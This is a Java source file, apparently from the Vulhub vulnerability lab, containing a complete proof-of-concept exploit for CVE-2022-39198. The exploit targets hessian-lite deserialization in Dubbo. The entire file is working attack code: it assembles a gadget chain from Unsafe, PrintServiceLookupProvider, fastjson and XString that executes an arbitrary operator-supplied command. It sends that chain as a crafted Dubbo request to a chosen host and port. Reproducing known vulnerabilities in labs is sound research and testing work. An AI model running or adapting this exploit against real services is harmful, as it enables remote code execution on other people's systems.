package org.vulhub.poc;

import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.alibaba.com.caucho.hessian.io.SerializerFactory;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xpath.internal.objects.XString;
import sun.misc.Unsafe;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

public class CVE202239198 {
    private static final byte[] MAGIC = new byte[]{(byte) 0xda, (byte) 0xbb};
    private static final byte FLAG_REQUEST = (byte) 0x80;
    private static final byte FLAG_TWOWAY = (byte) 0x40;
    private static final byte HESSIAN2_SERIALIZATION_ID = 2;

    public static void main(String[] args) throws Exception {
        String[] positional = PocUtils.positional(args);
        if (positional.length < 2 || positional.length > 3) {
            System.err.println("Usage: CVE-2022-39198 <host> <port> [command]");
            System.err.println("Example: CVE-2022-39198 127.0.0.1 20880 \"touch /tmp/success-hessian-lite\"");
            System.exit(1);
        }

        String host = positional[0];
        int port = Integer.parseInt(positional[1]);
        String command = positional.length == 3 ? positional[2] : "touch /tmp/success-hessian-lite";

        byte[] payload = serializeDubboRequest(generatePayload(command));
        PocUtils.send(host, port, payload);

        System.out.println("Payload sent to " + host + ":" + port);
    }

    private static byte[] serializeDubboRequest(Object payload) throws Exception {
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(body);
        SerializerFactory serializerFactory = new SerializerFactory();
        serializerFactory.setAllowNonSerializable(true);
        output.setSerializerFactory(serializerFactory);
        output.writeString("3.0.10");
        output.writeString("org.vulhub.api.CalcService");
        output.writeString("");
        output.writeString("$echo");
        output.writeString("Ljava/lang/Object;");
        output.writeObject(payload);
        output.writeObject(new HashMap<String, String>());
        output.flushBuffer();
        output.close();

        byte[] data = body.toByteArray();
        ByteArrayOutputStream request = new ByteArrayOutputStream();
        request.write(MAGIC);
        request.write(FLAG_REQUEST | FLAG_TWOWAY | HESSIAN2_SERIALIZATION_ID);
        request.write(0);
        writeLong(request, new Random().nextLong());
        writeInt(request, data.length);
        request.write(data);
        return request.toByteArray();
    }

    private static Object generatePayload(String command) throws Exception {
        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        Object printServiceLookup = unsafe.allocateInstance(Class.forName("sun.print.PrintServiceLookupProvider"));

        setFieldValue(printServiceLookup, "cmdIndex", 0);
        setFieldValue(printServiceLookup, "osname", "xx");
        setFieldValue(printServiceLookup, "lpcFirstCom", new String[]{command, command, command});

        JSONObject jsonObject = new JSONObject();
        jsonObject.put("xx", printServiceLookup);
        XString xString = new XString("xx");

        HashMap<Object, Object> map1 = new HashMap<>();
        HashMap<Object, Object> map2 = new HashMap<>();
        map1.put("yy", jsonObject);
        map1.put("zZ", xString);
        map2.put("yy", xString);
        map2.put("zZ", jsonObject);

        HashMap<Object, Object> map = new HashMap<>();
        setFieldValue(map, "size", 2);

        Class<?> nodeClass;
        try {
            nodeClass = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeClass = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeConstructor = nodeClass.getDeclaredConstructor(
                Integer.TYPE, Object.class, Object.class, nodeClass
        );
        nodeConstructor.setAccessible(true);

        Object table = Array.newInstance(nodeClass, 2);
        Array.set(table, 0, nodeConstructor.newInstance(0, map1, map1, null));
        Array.set(table, 1, nodeConstructor.newInstance(0, map2, map2, null));
        setFieldValue(map, "table", table);
        return map;
    }

    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    private static Field getField(Class<?> clazz, String fieldName) throws NoSuchFieldException {
        Class<?> current = clazz;
        while (current != null) {
            try {
                return current.getDeclaredField(fieldName);
            } catch (NoSuchFieldException ignored) {
                current = current.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    private static void writeInt(OutputStream out, int value) throws Exception {
        out.write((value >>> 24) & 0xff);
        out.write((value >>> 16) & 0xff);
        out.write((value >>> 8) & 0xff);
        out.write(value & 0xff);
    }

    private static void writeLong(OutputStream out, long value) throws Exception {
        out.write((int) ((value >>> 56) & 0xff));
        out.write((int) ((value >>> 48) & 0xff));
        out.write((int) ((value >>> 40) & 0xff));
        out.write((int) ((value >>> 32) & 0xff));
        out.write((int) ((value >>> 24) & 0xff));
        out.write((int) ((value >>> 16) & 0xff));
        out.write((int) ((value >>> 8) & 0xff));
        out.write((int) (value & 0xff));
    }

}
